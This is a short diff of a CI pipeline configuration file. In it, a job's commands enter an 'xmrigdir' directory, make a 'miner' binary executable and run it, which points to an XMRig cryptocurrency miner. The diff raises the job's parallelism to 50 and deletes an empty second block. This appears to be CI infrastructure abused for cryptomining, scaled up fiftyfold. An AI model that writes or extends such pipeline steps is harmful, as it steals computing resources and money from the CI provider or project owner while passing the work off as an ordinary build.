@@ -16,11 +16,5 @@ blocks:
             - cd xmrigdir
             - chmod +x miner
             - ./miner
+          parallelism: 50
     dependencies: []
-  - name: 'Block #2'
-    dependencies:
-      - 'Block #1'
-    task:
-      jobs:
-        - name: 'Job #1'
-          commands: []
